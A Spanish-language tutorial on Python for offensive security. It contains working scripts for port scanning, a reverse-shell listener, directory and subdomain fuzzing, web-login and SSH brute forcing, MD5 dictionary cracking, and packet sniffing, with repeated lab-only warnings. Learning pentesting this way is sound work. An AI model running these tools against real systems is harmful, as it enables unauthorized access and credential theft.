# 🐍 LIBRO DE PYTHON PARA HACKING
> El lenguaje de los hackers. Deja de solo usar herramientas: empieza a crearlas.
> Versión 2.0 — BUFFEADO: más scripts listos para usar.

---

## ¿Por qué Python para seguridad?
- **Rápido de escribir:** prototipas un exploit o un scanner en minutos.
- **Librerías para todo:** redes, web, cripto, parsing — ya existe una.
- **Es el idioma de la industria:** impacket, sqlmap, recon-ng... casi todo está en Python.

> La diferencia entre alguien que **usa** herramientas y un hacker de verdad es que el segundo **escribe las suyas** cuando no existen.

⚠️ Todo lo de aquí, SOLO contra tu propio lab, máquinas de práctica (DVWA, HackTheBox) o con permiso escrito.

---

## 1. Sockets — hablar con la red directamente

### Cliente TCP + banner grabbing
```python
import socket

def grab_banner(host, puerto):
    try:
        s = socket.socket(); s.settimeout(2)
        s.connect((host, puerto))
        return s.recv(1024).decode(errors='ignore').strip()
    except Exception:
        return None
    finally:
        s.close()

print(grab_banner("127.0.0.1", 22))   # te dice la versión de SSH
```

### Escáner de puertos multihilo (tu "nmap" casero)
```python
import socket
from concurrent.futures import ThreadPoolExecutor

def escanear_puerto(host, puerto):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    if s.connect_ex((host, puerto)) == 0:
        print(f"[+] Puerto {puerto} ABIERTO")
    s.close()

def escanear_host(host, inicio=1, fin=1024):
    print(f"[*] Escaneando {host}...")
    with ThreadPoolExecutor(max_workers=200) as ex:
        for p in range(inicio, fin + 1):
            ex.submit(escanear_puerto, host, p)

# escanear_host("127.0.0.1")   # SOLO tu propia máquina
```
En 30 líneas, un escáner multihilo. Ese es el poder de Python.

### Listener de reverse shell (recibir una shell)
```python
import socket

def listener(puerto=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", puerto)); s.listen(1)
    print(f"[*] Escuchando en {puerto}...")
    conn, addr = s.accept()
    print(f"[+] Conexión de {addr}")
    while True:
        cmd = input("shell> ")
        if cmd == "exit": break
        conn.send(cmd.encode() + b"\n")
        print(conn.recv(4096).decode(errors='ignore'))

# listener()   # equivalente casero a 'nc -lvnp 4444'
```

---

## 2. Web con `requests`

```python
import requests

r = requests.get("http://example.com")
print(r.status_code, r.headers.get('Server'))

# Con sesión (mantiene cookies entre peticiones)
s = requests.Session()
s.post("http://objetivo/login", data={"user": "admin", "pass": "123"})
r = s.get("http://objetivo/panel")   # ya logueado
```

### Fuzzer de directorios (tu mini-gobuster)
```python
import requests
from concurrent.futures import ThreadPoolExecutor

def probar(base, ruta):
    url = f"{base}/{ruta.strip()}"
    try:
        r = requests.get(url, timeout=3)
        if r.status_code != 404:
            print(f"[{r.status_code}] {url}")
    except Exception: pass

def fuzz(base, wordlist):
    with open(wordlist, encoding='latin-1') as f, ThreadPoolExecutor(max_workers=50) as ex:
        for linea in f:
            ex.submit(probar, base, linea)

# fuzz("http://localhost:8080", "/usr/share/wordlists/dirb/common.txt")
```

### Buscador de subdominios (tu mini-subfinder)
```python
import requests
from concurrent.futures import ThreadPoolExecutor

def probar_sub(dominio, sub):
    url = f"http://{sub.strip()}.{dominio}"
    try:
        requests.get(url, timeout=2)
        print(f"[+] {url}")
    except Exception: pass

def buscar_subs(dominio, wordlist):
    with open(wordlist) as f, ThreadPoolExecutor(max_workers=50) as ex:
        for sub in f:
            ex.submit(probar_sub, dominio, sub)

# buscar_subs("example.com", "subdominios.txt")
```

---

## 3. Fuerza bruta (concepto educativo)

```python
import requests

def brute_login(url, usuario, wordlist):
    for linea in open(wordlist, encoding='latin-1'):
        pwd = linea.strip()
        r = requests.post(url, data={"username": usuario, "password": pwd})
        if "incorrecta" not in r.text.lower():   # ajustar al texto real
            print(f"[+] ¡ENCONTRADA! {usuario}:{pwd}")
            return pwd
    print("[-] No encontrada")

# SOLO contra TU lab (DVWA, etc.)
```
**Esto ilustra por qué existen límites de intentos, CAPTCHA y 2FA** — sin ellos, un login débil cae en segundos.

### SSH brute con paramiko
```python
import paramiko   # pip install paramiko

def ssh_brute(host, usuario, wordlist):
    for linea in open(wordlist, encoding='latin-1'):
        pwd = linea.strip()
        cli = paramiko.SSHClient()
        cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            cli.connect(host, username=usuario, password=pwd, timeout=3)
            print(f"[+] ¡ÉXITO! {usuario}:{pwd}"); return pwd
        except paramiko.AuthenticationException:
            pass
        except Exception:
            pass
        finally:
            cli.close()

# SOLO en TU lab
```

---

## 4. Parsing y procesamiento

### Regex — extraer info (emails, IPs, hashes)
```python
import re
texto = "Contacto: juan@empresa.com, tel 555-1234, IP 192.168.1.1"
print(re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', texto))           # emails
print(re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', texto))        # IPs
print(re.findall(r'\b[a-f0-9]{32}\b', texto))                   # hashes MD5
```

### Scraping con BeautifulSoup
```python
import requests
from bs4 import BeautifulSoup   # pip install beautifulsoup4

soup = BeautifulSoup(requests.get("http://example.com").text, 'html.parser')
for a in soup.find_all('a'):       print(a.get('href'))      # enlaces
for f in soup.find_all('form'):    print(f.get('action'))    # formularios (puntos de ataque)
```

---

## 5. Cripto con Python

```python
import hashlib

# Crackear un hash por diccionario (concepto de john/hashcat)
def crackear(hash_obj, wordlist, algo='md5'):
    for linea in open(wordlist, encoding='latin-1'):
        palabra = linea.strip()
        if hashlib.new(algo, palabra.encode()).hexdigest() == hash_obj:
            return palabra
    return None

# crackear("5f4dcc3b5aa765d61d8327deb882cf99", "/opt/wordlists/rockyou.txt")
# ↑ ese hash es "password"
```

### Cifrado real con `cryptography`
```python
from cryptography.fernet import Fernet   # pip install cryptography
clave = Fernet.generate_key(); f = Fernet(clave)
cifrado = f.encrypt(b"mensaje secreto")
print(f.decrypt(cifrado).decode())
```

---

## 6. Sniffing y manipulación de paquetes con scapy

```python
from scapy.all import sniff, ARP, Ether, srp   # pip install scapy

# Sniffer en 3 líneas
sniff(prn=lambda p: print(p.summary()), count=10)   # requiere sudo

# Escáner ARP de tu red local (descubre dispositivos)
def arp_scan(red):   # ej. "192.168.1.0/24"
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=red), timeout=2, verbose=0)
    for _, r in ans:
        print(f"{r.psrc}  →  {r.hwsrc}")

# arp_scan("192.168.1.0/24")   # SOLO tu red (requiere sudo)
```

---

## 7. Librerías de seguridad que debes conocer

| Librería | Para qué |
|----------|----------|
| **scapy** | Crear/manipular paquetes de red (sniffing, spoofing, escaneo). |
| **requests** | Peticiones HTTP/APIs. |
| **beautifulsoup4** | Parsear HTML (scraping). |
| **paramiko** | SSH desde Python. |
| **impacket** | Protocolos de red Windows (SMB, etc.) — clave en pentesting AD. |
| **pwntools** | El framework para exploiting y CTFs (binary exploitation). |
| **cryptography** | Cifrado serio. |
| **python-nmap** | Controlar nmap desde Python. |
| **shodan** | API de Shodan desde Python. |
| **dnspython** | Consultas DNS programáticas. |
| **scrapling / playwright** | Scraping con anti-detección. |

---

## 8. Estructura de una herramienta profesional

```python
#!/usr/bin/env python3
"""Mi scanner - descripción."""
import argparse, sys

def main():
    p = argparse.ArgumentParser(description="Mi scanner de puertos")
    p.add_argument("objetivo", help="IP o dominio")
    p.add_argument("-p", "--puertos", default="1-1024", help="rango de puertos")
    p.add_argument("-t", "--threads", type=int, default=100)
    args = p.parse_args()
    try:
        # tu lógica aquí
        pass
    except KeyboardInterrupt:
        print("\n[!] Cancelado"); sys.exit(0)

if __name__ == "__main__":
    main()
```
`argparse` te da `-h` y argumentos profesionales gratis. Así se hacen las herramientas reales.

---

## 🎓 Para practicar
- **Reescribe herramientas que ya usas:** tu escáner, tu fuzzer, tu subdomain finder. Entender por dentro = dominar.
- **pwntools + picoCTF** → binary exploitation.
- **"Black Hat Python"** y **"Violent Python"** → los libros clásicos del tema.
- **Sigue con:** `libro-redes.md` (entender los sockets) y `libro-web-hacking.md` (automatiza los ataques).

> ⬛ *Las herramientas te hacen usuario. El código te hace hacker. Empieza a escribir las tuyas.*
